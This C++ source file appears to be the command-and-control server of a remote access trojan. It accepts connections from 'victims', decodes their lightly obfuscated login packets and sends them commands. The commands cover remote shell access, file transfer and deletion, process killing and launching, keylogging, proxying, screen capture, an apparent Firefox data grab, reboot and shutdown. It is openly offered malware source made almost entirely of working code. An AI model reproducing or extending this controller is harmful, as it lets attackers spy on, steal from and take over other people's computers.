#include "stdafx.h"
#include "net.h"
#include "client.h"
#include "RShellSend.h"
#include "RShell.h"

CNETSTRUCT	cndata[MAX_SIM_VICTIMS];
CString		NewText[MAX_LINES];
int			CurrentLine = 0;
int			id = 1;
FILE		*logfile;

/*
	0 = write in status bar
	1 = new client connected
	2 = client disconnected
	3 = keylogger action
*/


typedef struct
{
	char	name[32];
	bool	bkeylogging;
	char	proxy[16];
	char	pversion[8];
	BOOL	logged;
} login_data_s;


void NET_LogToFile(BOOL in, char *from, char *data)
{
	// todo: time and date
	FILE	*logfile;

	EnterCriticalSection(&cs);
	logfile = fopen("netlog.txt", "ab");
	if (logfile != NULL)
	{
		if (in)
			fputs("IN from ", logfile);
		else
			fputs("OUT to ", logfile);
		fputs(from, logfile);
		fputs(": ", logfile);
		fputs(data, logfile);
		fputs("\r\n", logfile);
	}
	fclose(logfile);
	LeaveCriticalSection(&cs);
}

void NET_SendMessageToMainThread(HWND hWnd, MSGTYPE type, char *buffer, int num)
{
	unsigned int	i = 0;

	if (type == STATUS)
	{
		NetMessage = buffer;
		i = 0;	
	}
	else if (type == NEW)
	{
		i = 1;
	}
	else if (type == DEAD)
	{
		NetMessage = buffer;
		i = 2;
	}
	else if (type == KEYLOGGERACTION)
	{
		NetMessage = buffer;
		i = 3;
	}
	else if (type == PROXYACTION)
	{
		NetMessage = buffer;
		i = 4;
	}
	else if (type == CAPTURESEND)
	{
		NetMessage = buffer;
		i = 5;
	}
	else if (type ==CAPTUREACTION)
	{
		NetMessage = buffer;
		i = 6;
	}
	else if (type == PINGUPDATE)
	{
		i = 100;
	}
	else 
		return;

	::PostMessage(hWnd, WM_NET_MESSAGE , i, (LPARAM)num);
}


int NET_CheckTimeout(SOCKET sock)
{
	struct timeval		timeout;
	fd_set				fd;

	timeout.tv_sec = PingInterval * 2;
	timeout.tv_usec = 0;

	FD_ZERO(&fd); 
	FD_SET(sock, &fd);

	return select(sock, &fd, NULL, NULL, &timeout);
}


void NET_CloseConnections()
{
	int		i;
	
	EnterCriticalSection(&cs);
	for (i = 0; i < MAX_SIM_VICTIMS; i++)
	{
		closesocket(cndata[i].sock);
		cndata[i].sock = SOCKET_ERROR;
	}
	LeaveCriticalSection(&cs);
}


void NET_ClearVictim(HWND hWnd, int i)
{
	char	buff[MAX_BUFF_SIZE];

	if (i < 0)
		return;

	if (cndata[i].hWnd != NULL)
		::PostMessage(cndata[i].hWnd, WM_LOST_CONNECTION , (WPARAM)i, (LPARAM)0);

	//EnterCriticalSection(&cs);
	if (cndata[i].name[0] != 0)
	{
		_snprintf(buff, sizeof(buff) - 1, "Lost connection with %s (%s)", cndata[i].name, cndata[i].ip);
		NET_SendMessageToMainThread(hWnd, DEAD, buff, i);
	}
	//LeaveCriticalSection(&cs);

	EnterCriticalSection(&cs);
	cndata[i].id = 0;
	cndata[i].ip[0] = 0;
	cndata[i].name[0] = 0;
	closesocket(cndata[i].sock);
	cndata[i].sock = SOCKET_ERROR;
	cndata[i].bkeylogging = false;
	cndata[i].proxy[0] = 0;
	cndata[i].pversion[0] = 0;
	cndata[i].hWnd = NULL;
	LeaveCriticalSection(&cs);
}

/*
int NET_LoginVictim(SOCKET sock, int i)
{
	// listen for victims login packet
	int			len = 0, l = 0;
	char		buffer[MAX_RECEIVE_BUFFER] = {0}, *n;

	while (NET_CheckTimeout(sock) > 0)
	{
		if (len == MAX_RECEIVE_BUFFER - 1)
			break;
		l = recv(sock, buffer + len, 1, 0);
		if (l == WSAECONNRESET || l <= 0)
		{
			return 0;
		}
		buffer[len] = ~ buffer[len];
		len += l;
		if (buffer[len-1] == '\n')
			break;
	}

	buffer[len-1] = 0;

	// login"name"protocolversion"keylogger"proxy

	n = strtok(buffer, "\"");
	if (strcmp(n, VictimLoginPacket))
		return 0;

	n = strtok(NULL, "\"");
	if (n == NULL)
		return 0;
	
	EnterCriticalSection(&cs);
	_snprintf(cndata[i].name, sizeof(cndata[i].name) - 1, "%s", n);
	LeaveCriticalSection(&cs);

	n = strtok(NULL, "\"");
	if (n == NULL)
		return 0;

	EnterCriticalSection(&cs);
	_snprintf(cndata[i].pversion, sizeof(cndata[i].pversion) - 1, "%s", n);
	LeaveCriticalSection(&cs);

	n = strtok(NULL, "\"");
	if (n == NULL)
		return 0;

	if (atoi(n) == 1)
		cndata[i].bkeylogging = TRUE;
	else
		cndata[i].bkeylogging = FALSE;

	n = strtok(NULL, "\"");
	if (n == NULL)
		return 0;

	if (atoi(n) > 0)
	{
		EnterCriticalSection(&cs);
		_snprintf(cndata[i].proxy, sizeof(cndata[i].proxy) - 1, "On:%s", n);
		LeaveCriticalSection(&cs);
	}

	return 1;
}
*/

login_data_s NET_LoginVictim(SOCKET sock)
{
	// listen for victims login packet
	int			len = 0, l = 0;
	char		buffer[MAX_RECEIVE_BUFFER] = {0}, *n;
	login_data_s login_data;

	login_data.logged = FALSE;

	while (NET_CheckTimeout(sock) > 0)
	{
		if (len == MAX_RECEIVE_BUFFER - 1)
			break;
		l = recv(sock, buffer + len, 1, 0);
		if (l == WSAECONNRESET || l <= 0)
		{
			return login_data;
		}
		buffer[len] = ~ buffer[len];
		len += l;
		if (buffer[len-1] == '\n')
			break;
	}

	NET_LogToFile(TRUE, "New user", buffer);

	buffer[len-1] = 0;

	// login"name"protocolversion"keylogger"proxy

	n = strtok(buffer, "\"");
	if (strcmp(n, VictimLoginPacket))
		return login_data;

	n = strtok(NULL, "\"");
	if (n == NULL)
		return login_data;
	
	EnterCriticalSection(&cs);
	_snprintf(login_data.name, sizeof(login_data.name) - 1, "%s", n);
	LeaveCriticalSection(&cs);

	n = strtok(NULL, "\"");
	if (n == NULL)
		return login_data;

	EnterCriticalSection(&cs);
	_snprintf(login_data.pversion, sizeof(login_data.pversion) - 1, "%s", n);
	LeaveCriticalSection(&cs);

	n = strtok(NULL, "\"");
	if (n == NULL)
		return login_data;

	if (atoi(n) == 1)
		login_data.bkeylogging = TRUE;
	else
		login_data.bkeylogging = FALSE;

	n = strtok(NULL, "\"");
	if (n == NULL)
		return login_data;

	if (atoi(n) > 0)
	{
		EnterCriticalSection(&cs);
		_snprintf(login_data.proxy, sizeof(login_data.proxy) - 1, "On:%s", n);
		LeaveCriticalSection(&cs);
	}

	login_data.logged = TRUE;

	return login_data;
}

int NET_EncodeAndSend(SOCKET sock, char *data, int len)
{
	int		i;

	for (i = 0; i < len; i++)
		data[i] = ~ data[i];

	return send(sock, data, len, 0);
}


int NET_Send(int i, MSGTYPE ord, char *extra)
{
	char	temp[MAX_RECEIVE_BUFFER];

	switch (ord)
	{
	case ECHO:
		_snprintf(temp, sizeof(temp) - 1, "echo\n");
		break;
	case DIE:
		_snprintf(temp, sizeof(temp) - 1, "die\n");
		break;
	case UNINSTALL:
		_snprintf(temp, sizeof(temp) - 1, "uninstall\n");
		break;
	case MSGBOX:
		_snprintf(temp, sizeof(temp) - 1, "msgbox %s\n", extra);
		break;
	case SHELL:
		_snprintf(temp, sizeof(temp) - 1, "shell %s\n", extra);
		break;
	case INFO:
		_snprintf(temp, sizeof(temp) - 1, "info\n");
		break;
	case FILES:
		_snprintf(temp, sizeof(temp) - 1, "files %s\n", extra);
		break;
	case FILEDEL:
		_snprintf(temp, sizeof(temp) - 1, "filedel %s\n", extra);
		break;
	case FILEOUT:
		_snprintf(temp, sizeof(temp) - 1, "fileout %s\n", extra);
		break;
	case FILEIN:
		_snprintf(temp, sizeof(temp) - 1, "filein %s\n", extra);
		break;
	case FILEMKDIR:
		_snprintf(temp, sizeof(temp) - 1, "filemkdir %s\n", extra);
		break;
	case FILEDELDIR:
		_snprintf(temp, sizeof(temp) - 1, "filedeldir %s\n", extra);
		break;
	case PROCESS_REFRESH:
		_snprintf(temp, sizeof(temp) - 1, "process refresh\n");
		break;
	case PROCESS_KILL:
		_snprintf(temp, sizeof(temp) - 1, "process kill %s\n", extra);
		break;
	case PROCESS_RUN:
		_snprintf(temp, sizeof(temp) - 1, "process run %s\n", extra);
		break;
	case REBOOT:
		_snprintf(temp, sizeof(temp) - 1, "reboot\n");
		break;
	case SHUTDOWN:
		_snprintf(temp, sizeof(temp) - 1, "shutdown\n");
		break;
	case KEYLOGGER:
		_snprintf(temp, sizeof(temp) - 1, "keylogger %s\n", extra);
		break;
	case PROXY:
		_snprintf(temp, sizeof(temp) - 1, "proxy %s\n", extra);
		break;
	case FIREFOX:
		_snprintf(temp, sizeof(temp) - 1, "firefox\n");
		break;
	case CAPTURESCREEN:
		_snprintf(temp, sizeof(temp) - 1, "capturescreen %s\n", extra);
		break;
	default:
		return 0;
	}

	NET_LogToFile(FALSE, cndata[i].ip, temp);

	//EnterCriticalSection(&cs);
	NET_EncodeAndSend(cndata[i].sock, temp, strlen(temp));
	//LeaveCriticalSection(&cs);

	return 1;
}


void NET_Parse(char *buffer, HWND hWnd, int i)
{
	char	*a1, *a2;

	a2 = strchr(buffer, ' ') + 1;
	a1 = strtok(buffer, " ");
	
	if (a1 == NULL)
		return;

	else if (!strcmp(a1, "echo"))
	{
		//EnterCriticalSection(&cs);
		cndata[i].ping = GetTickCount() - cndata[i].psent;
		//LeaveCriticalSection(&cs);
		NET_SendMessageToMainThread(hWnd, PINGUPDATE, NULL, i);
	}
	else if (!strcmp(a1, "shell"))
	{
		if (CurrentLine == MAX_LINES)
			CurrentLine = 0;
		if (a2 != NULL)
			NewText[CurrentLine] = a2;
		NewText[CurrentLine] += "\r";
		NewText[CurrentLine] += "\n";

		::PostMessage(cndata[i].hWnd, WM_NEW_SHELL_MESSAGE , (WPARAM)CurrentLine, (LPARAM)0);

		CurrentLine++;

		return;
	}
	else if (!strcmp(a1, "info"))
	{
		if (CurrentLine == MAX_LINES)
			CurrentLine = 0;
		if (a2 != NULL)
			NewText[CurrentLine] = a2;
		NewText[CurrentLine] += "\r";
		NewText[CurrentLine] += "\n";

		::PostMessage(cndata[i].hWnd, WM_NEW_INFO_MESSAGE , (WPARAM)CurrentLine, (LPARAM)i);

		CurrentLine++;

		return;
	}
	else if (a2 == NULL)
		return;
	else if (!strcmp(a1, "capturesend"))
	{
		NET_SendMessageToMainThread(hWnd, CAPTURESEND, a2, i);
	}
	else if (!strcmp(a1, "captureaction"))
	{
		NET_SendMessageToMainThread(hWnd, CAPTUREACTION, a2, i);
	}
	else if (!strcmp(a1, "keyloggeraction"))
	{
		NET_SendMessageToMainThread(hWnd, KEYLOGGERACTION, a2, i);
	}
	else if (!strcmp(a1, "proxyaction"))
	{
		NET_SendMessageToMainThread(hWnd, PROXYACTION, a2, i);
	}
	else if (!strcmp(a1, "fileaction"))
	{
		if (!strcmp(a2, "success"))
			// file deleted
			::PostMessage(cndata[i].hWnd, WM_NEW_FILE_MESSAGE , (WPARAM)0, (LPARAM)4);
		else
			// failed to delete
			::PostMessage(cndata[i].hWnd, WM_NEW_FILE_MESSAGE , (WPARAM)0, (LPARAM)5);

		return;
	}
	else if (!strcmp(a1, "fileinout"))
	{
		if (!strcmp(a2, "failed"))
			::PostMessage(cndata[i].hWnd, WM_NEW_INOUT_FILE_MESSAGE_ERROR, (WPARAM)0, (LPARAM)2);
		else if (!strcmp(a2, "success"))
			::PostMessage(cndata[i].hWnd, WM_NEW_INOUT_FILE_MESSAGE_ERROR, (WPARAM)1, (LPARAM)0);

		return;
	}
	else if (!strcmp(a1, "files"))
	{
		if (CurrentLine == MAX_LINES)
			CurrentLine = 0;
		NewText[CurrentLine] = a2 + 4;

		// new file = 0
		// new dir = 1
		// new drive = 2
		// end = 3
		if (!strncmp(a2, "fil", 3))
		{
			::PostMessage(cndata[i].hWnd, WM_NEW_FILE_MESSAGE , (WPARAM)CurrentLine, (LPARAM)0);
		}
		else if (!strncmp(a2, "dir", 3))
		{
			::PostMessage(cndata[i].hWnd, WM_NEW_FILE_MESSAGE , (WPARAM)CurrentLine, (LPARAM)1);
		}
		else if (!strncmp(a2, "drv", 3))
		{
			::PostMessage(cndata[i].hWnd, WM_NEW_FILE_MESSAGE , (WPARAM)CurrentLine, (LPARAM)2);
		}
		else if (!strncmp(a2, "end", 3))
		{
			::PostMessage(cndata[i].hWnd, WM_NEW_FILE_MESSAGE , (WPARAM)CurrentLine, (LPARAM)3);
		}

		CurrentLine++;

		return;
	}
	else if (!strcmp(a1, "process"))
	{
		if (CurrentLine == MAX_LINES)
			CurrentLine = 0;
		NewText[CurrentLine] = a2;

		::PostMessage(cndata[i].hWnd, WM_NEW_PROCESS_MESSAGE , (WPARAM)CurrentLine, (LPARAM)0);

		CurrentLine++;

		return;
	}
	else if (!strcmp(a1, "processaction"))
	{
		if (!strcmp(a2, "failed"))
			::PostMessage(cndata[i].hWnd, WM_NEW_PROCESS_MESSAGE, (WPARAM)0, (LPARAM)2);
		else if (!strcmp(a2, "success"))
			::PostMessage(cndata[i].hWnd, WM_NEW_PROCESS_MESSAGE, (WPARAM)0, (LPARAM)1);

		return;
	}
	else
		return;
}


UINT NET_VictimThread(LPVOID param)
{
	int			ret, i, len, l;
	char		buffer[MAX_RECEIVE_BUFFER] = {0};
	VNETSTRUCT	v = *((VNETSTRUCT *)param);

	login_data_s login_data = NET_LoginVictim(v.sock);

	if (!login_data.logged)
	{
		//NET_ClearVictim(v.hWnd, v.i);
		closesocket(v.sock);
		return 0;
	}

	EnterCriticalSection(&cs);
	for (i = 0; i < v.maxvicts; i++)
	{
		if (cndata[i].id == 0)
		{
			cndata[i].id = id;
			cndata[i].sock = v.sock;
			_snprintf(cndata[i].ip, sizeof(cndata[i].ip), "%s", v.ip);
			cndata[i].bkeylogging = login_data.bkeylogging;
			_snprintf(cndata[i].name, sizeof(cndata[i].name), "%s", login_data.name);
			_snprintf(cndata[i].proxy, sizeof(cndata[i].proxy), "%s", login_data.proxy);
			_snprintf(cndata[i].pversion, sizeof(cndata[i].pversion), "%s", login_data.pversion);

			id++;
			break;
		}
	}
	LeaveCriticalSection(&cs);
	if (i == v.maxvicts)
	{
		closesocket(v.sock);
		return 0;
	}

//	_snprintf(buff, sizeof(buff) - 1, "Victim no. %d: %s, name: %s", cndata[v.i].id, cndata[v.i].ip, cndata[v.i].name);
	NET_SendMessageToMainThread(v.hWnd, NEW, NULL, i);

	while (cndata[i].sock > 0)
	{
		ret = 0;
		len = 0;
		memset(buffer, 0, sizeof(buffer));
		while ((ret = NET_CheckTimeout(cndata[i].sock)) > 0)
		{
			if (len == MAX_RECEIVE_BUFFER - 1)
				break;
			l = recv(cndata[i].sock, buffer + len, 1, 0);
			if (l == WSAECONNRESET || l <= 0)
			{
				NET_ClearVictim(v.hWnd, i);
				return 0;
			}
			buffer[len] = ~ buffer[len];
			len += l;
			if (buffer[len-1] == '\n') // \n for ending order
				break;
		}
		
		if (ret <= 0)
			break;
		else if (len < 2)
			continue;
		else
		{
			buffer[len-1] = 0;
			NET_LogToFile(TRUE, cndata[i].ip, buffer);
			NET_Parse(buffer, v.hWnd, i);
		}
	}

	NET_ClearVictim(v.hWnd, i);
	return 0;
}


UINT NET_Thread(LPVOID param)
{
	char			buff[MAX_BUFF_SIZE];
	SOCKET			sock, client_sock;
	sockaddr_in		sin;
	IN_ADDR			in;
	int				on,
					size = sizeof(sin),
//					id = 1,
					i;

	NETSTRUCT		net = *((NETSTRUCT *)param);

	EnterCriticalSection(&cs);
	for (i = 0; i < net.maxvicts; i++)
	{
		cndata[i].id = 0;
		cndata[i].sock = SOCKET_ERROR;
		cndata[i].bkeylogging = false;
	}
	LeaveCriticalSection(&cs);

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *) &on, sizeof(on));
	if (sock == INVALID_SOCKET)
	{
		_snprintf(buff, sizeof(buff) - 1, "Failed to initialize socket.");
		NET_SendMessageToMainThread(net.hWnd, STATUS, buff, 0);	
		return 0;
	}

	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = 0;
	sin.sin_port = htons(net.port);

	if (bind(sock, (SOCKADDR*)&sin, sizeof(sin)) == SOCKET_ERROR) 
	{
		_snprintf(buff, sizeof(buff) - 1, "Failed to bind port %d to listen. Choose another port.", net.port);
		NET_SendMessageToMainThread(net.hWnd, STATUS, buff, 0);
		return 0;
	}
	else
	{
		_snprintf(buff, sizeof(buff) - 1, "Port %d binded. Waiting for victims to connect.", net.port);
		NET_SendMessageToMainThread(net.hWnd, STATUS, buff, 0);
	}

	if (listen(sock, MAX_WAITING_CONNECTIONS) == SOCKET_ERROR) 
	{
		_snprintf(buff, sizeof(buff) - 1, "Failed to listen on port %d.", net.port);
		NET_SendMessageToMainThread(net.hWnd, STATUS, buff, 0);
		return 0;
	}

	while (1) 
	{
		client_sock = SOCKET_ERROR;

		while (client_sock == SOCKET_ERROR) 
		{
			client_sock = accept(sock, (struct sockaddr*)&sin, &size);
		}

		if (client_sock != INVALID_SOCKET) 
		{
			VNETSTRUCT v;
			v.hWnd = net.hWnd;
			v.sock = client_sock;
			in.s_addr = sin.sin_addr.s_addr;
			_snprintf(v.ip, sizeof(v.ip), "%s", inet_ntoa(in));
			v.maxvicts = net.maxvicts;

			CWinThread* pThread = AfxBeginThread(NET_VictimThread, (LPVOID)&v);
			Sleep(50);

			/*
			EnterCriticalSection(&cs);
			for (i = 0; i < net.maxvicts; i++)
			{
				if (cndata[i].id == 0)
				{
					cndata[i].id = id;
					cndata[i].sock = client_sock;
					in.s_addr = sin.sin_addr.s_addr;
					_snprintf(cndata[i].ip, sizeof(cndata[i].ip), "%s", inet_ntoa(in));

					VNETSTRUCT v;
					v.hWnd = net.hWnd;
					v.i = i;

					CWinThread* pThread = AfxBeginThread(NET_VictimThread, (LPVOID)&v);
					Sleep(50);
					id++;

					break;
				}
			}	
			LeaveCriticalSection(&cs);
			*/
		}
	}

	return 0;
}


UINT NET_PingThread(LPVOID param)
{
	int				i;
	NETSTRUCT		net = *((NETSTRUCT *)param);

	Sleep(1000);

	while (1)
	{
		for (i = 0; i < net.maxvicts; i++)
		{
			EnterCriticalSection(&cs);
			if (cndata[i].sock != SOCKET_ERROR || cndata[i].sock != INVALID_SOCKET)
			{
				cndata[i].psent = GetTickCount();
				NET_Send(i, ECHO, NULL);
			}
			LeaveCriticalSection(&cs);
			Sleep(50);
		}
		Sleep(PingInterval * 1000);
	}

	return 0;
}